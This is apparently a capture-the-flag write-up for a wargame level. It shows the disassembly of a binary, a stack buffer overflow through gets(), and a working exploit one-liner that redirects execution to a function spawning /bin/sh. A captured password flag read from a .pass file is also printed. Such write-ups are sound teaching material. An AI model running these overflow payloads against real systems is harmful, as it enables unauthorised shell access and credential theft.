# leve02

In this level, we are greeted with a 32-bit ELF *static* executable binary with symbols not stripped.

Static analysis using `objdump` reveals that there is a `run` function :

```text
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00 
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    
```

This function gives us access to a shell. The address `0x8048584` is pointing to a read-only string `/bin/sh`. We somehow needs to execute this function to retrieve the flag !

The `main` function is just a really simple program :

```
08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave  
 8048496:	c3                   	ret    
```

First, the stack is aligned to a 16-byte boundary, and **0x50** bytes are allocated, likely as a buffer. The program then calls gets, an inherently unsafe C library function prone to **buffer overflow**, as it does not perform *bounds checking* on the buffer.

To execute the run function, we can exploit this buffer overflow to overwrite the return address of the main function, redirecting execution to run.

In a C program linked with the C Standard Library, main is not the actual **entry point**. Instead, it is invoked by the C library’s initialization routine. This is why we target the return address pushed onto the stack (commonly called **saved eip**).

The first step is to fill the buffer completely until we trigger a segmentation fault—this will confirm that we have reached the return address location.

```bash
python -c 'print("a"*76)' | ./level1
```

Through trial and error, we observe a *Segmentation Fault* when exceeding 76 characters (i.e., 76 bytes). This confirms that we have reached and overwritten the return address stored on the stack.

Next, we need to replace this return address with the entry point of the `run` function, which is located at `0x08048444`. Since we are operating on a little-endian architecture (**x86**), we must provide the address in reverse byte order (*least significant byte first).

```bash
python -c 'print("a"*76 + "\x44\x84\x04\x08")' | ./level1
```

We get a message :

```bash
Good... Wait what?
Segmentation Fault
```

It seems we have achieved our goal—reaching the run function. However, the program segfaults, and we do not get a shell !

The reason is simple: we injected our payload using a pipe, which immediately closes the standard input of the level1 program. When `system` executes sh, the closed standard input causes the shell to exit immediately.

Additionally, since we manually modified the stack, the ret instruction sets `eip` to `0x00000000`, leading to a segmentation fault (for the curious, this is probably the **saved ebp** pushed by main in the function prologue).

The solution is to keep the standard input open by chaining a second command, such as cat.

```bash
level1@RainFall:~$ (python -c 'print("a"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
whoami
level2
cd ../level2
ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Success !